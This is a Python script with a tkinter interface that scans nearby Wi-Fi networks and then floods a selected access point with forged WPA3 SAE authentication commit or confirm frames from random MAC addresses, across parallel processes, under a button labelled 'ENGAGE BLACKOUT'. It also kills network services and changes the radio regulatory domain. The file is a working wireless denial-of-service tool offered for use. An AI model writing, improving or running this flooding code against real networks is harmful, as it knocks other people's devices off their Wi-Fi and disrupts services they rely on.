import os, sys, time, multiprocessing, random, subprocess
from scapy.all import *
import tkinter as tk
from tkinter import ttk

class SAEControlCenter:
    def __init__(self, iface):
        self.iface = iface
        self.running = True
        self.flooding = False
        self.processes = []
        self.discovered = {} # BSSID: {SSID, CH}
        self.current_ch = 1
        
        self.prep_hardware()
        self.build_gui()

    def prep_hardware(self):
        os.system("sudo iw reg set PH")
        os.system("sudo airmon-ng check kill > /dev/null 2>&1")
        os.system(f"sudo ip link set {self.iface} down && sudo iw dev {self.iface} set type monitor && sudo ip link set {self.iface} up")

    def build_gui(self):
        self.root = tk.Tk()
        self.root.title("SAE Surgical Control Center v11.5")
        self.root.geometry("850x600")
        self.root.configure(bg="#050505")

        # Tabs for Scanner and Controls
        self.tabs = ttk.Notebook(self.root)
        self.scan_tab = tk.Frame(self.tabs, bg="#050505")
        self.flood_tab = tk.Frame(self.tabs, bg="#050505")
        self.tabs.add(self.scan_tab, text=" 1. SCANNER ")
        self.tabs.add(self.flood_tab, text=" 2. NITRO CONTROLS ")
        self.tabs.pack(expand=1, fill="both")

        # --- SCANNER TAB ---
        self.tree = ttk.Treeview(self.scan_tab, columns=("SSID", "BSSID", "CH"), show="headings")
        for c in ("SSID", "BSSID", "CH"): self.tree.heading(c, text=c)
        self.tree.pack(fill="both", expand=True, padx=10, pady=10)
        tk.Label(self.scan_tab, text="Select a target and then go to Nitro Controls", fg="#888", bg="#050505").pack()

        # --- NITRO CONTROLS TAB ---
        # Target Display (Locked from Scanner)
        self.target_lbl = tk.Label(self.flood_tab, text="NO TARGET SELECTED", fg="#ff4444", bg="#050505", font=("Courier", 12, "bold"))
        self.target_lbl.pack(pady=20)

        # Handshake Level
        tk.Label(self.flood_tab, text="HANDSHAKE LEVEL (1=Commit, 2=Confirm):", fg="#00FF41", bg="#050505").pack()
        self.level_slider = tk.Scale(self.flood_tab, from_=1, to=5, orient="horizontal", bg="#050505", fg="white", highlightthickness=0)
        self.level_slider.pack(fill="x", padx=100)

        # Engines
        tk.Label(self.flood_tab, text="NITRO ENGINES (Parallel Procs):", fg="#00FF41", bg="#050505").pack(pady=10)
        self.proc_slider = tk.Scale(self.flood_tab, from_=1, to=multiprocessing.cpu_count(), orient="horizontal", bg="#050505", fg="white", highlightthickness=0)
        self.proc_slider.set(2)
        self.proc_slider.pack(fill="x", padx=100)

        self.btn = tk.Button(self.flood_tab, text="ENGAGE BLACKOUT", bg="#aa0000", fg="white", height=2, command=self.toggle_flood)
        self.btn.pack(pady=30)
        
        tk.Button(self.root, text="REPAIR & EXIT", bg="#333", fg="white", command=self.shutdown).pack(pady=5)

        # Background Threads
        threading.Thread(target=self.hopper, daemon=True).start()
        threading.Thread(target=self.scanner, daemon=True).start()

    def engine_logic(self, bssid, level, ch):
        os.system(f"sudo iw dev {self.iface} set channel {ch}")
        conf.verb = 0
        s = conf.L2socket(iface=self.iface)
        base_pkt = (RadioTap() / 
                    Dot11(addr1=bssid, addr3=bssid) / 
                    Dot11Auth(algo=3, seqnum=level, status=0) / 
                    Dot11Elt(ID=19, info=b"\x13\x00") / 
                    Raw(load=b"\x00"*32))
        while True:
            base_pkt.addr2 = RandMAC()
            s.send(base_pkt)

    def toggle_flood(self):
        if not self.flooding:
            sel = self.tree.selection()
            if not sel: 
                self.target_lbl.config(text="ERROR: SELECT TARGET IN SCANNER TAB")
                return
            
            target = self.tree.item(sel[0])["values"] # [SSID, BSSID, CH]
            self.target_lbl.config(text=f"TARGETING: {target[0]}", fg="#00FF41")
            
            self.flooding = True
            self.btn.config(text="STOPPING...", state="disabled")
            
            for _ in range(self.proc_slider.get()):
                p = multiprocessing.Process(target=self.engine_logic, args=(target[1], self.level_slider.get(), target[2]))
                p.start()
                self.processes.append(p)
            self.btn.config(text="HALT BLACKOUT", state="normal", bg="#555")
        else:
            self.flooding = False
            for p in self.processes: p.terminate()
            self.processes = []
            self.btn.config(text="ENGAGE BLACKOUT", bg="#aa0000")

    def hopper(self):
        # Logic: Auto-detect all 2.4/5G channels supported by your AC card
        try:
            output = subprocess.check_output(f"iwlist {self.iface} freq", shell=True).decode()
            chans = [int(l.split("Channel ")[1].split(":")[0]) for l in output.split("\n") if "Channel " in l]
        except: chans = [1, 6, 11, 36, 149]
        
        i = 0
        while self.running:
            if not self.flooding:
                self.current_ch = chans[i]
                os.system(f"sudo iw dev {self.iface} set channel {self.current_ch}")
                i = (i + 1) % len(chans)
                time.sleep(1.5)
            else: time.sleep(1)

    def scanner(self):
        def cb(pkt):
            if pkt.haslayer(Dot11Beacon):
                b = pkt.addr3
                if b not in self.discovered:
                    s = pkt.info.decode(errors='ignore') or "Hidden"
                    self.discovered[b] = {"SSID": s, "CH": self.current_ch}
                    self.root.after(0, self.update_scan_ui)
        sniff(iface=self.iface, prn=cb, store=0)

    def update_scan_ui(self):
        for i in self.tree.get_children(): self.tree.delete(i)
        for b, info in self.discovered.items():
            self.tree.insert("", "end", values=(info["SSID"], b, info["CH"]))

    def shutdown(self):
        self.running = False; self.flooding = False
        for p in self.processes: p.terminate()
        os.system(f"sudo ip link set {self.iface} down && sudo iw dev {self.iface} set type managed && sudo ip link set {self.iface} up && sudo systemctl restart NetworkManager")
        self.root.destroy()

if __name__ == "__main__":
    SAEControlCenter(sys.argv[1]).root.mainloop()
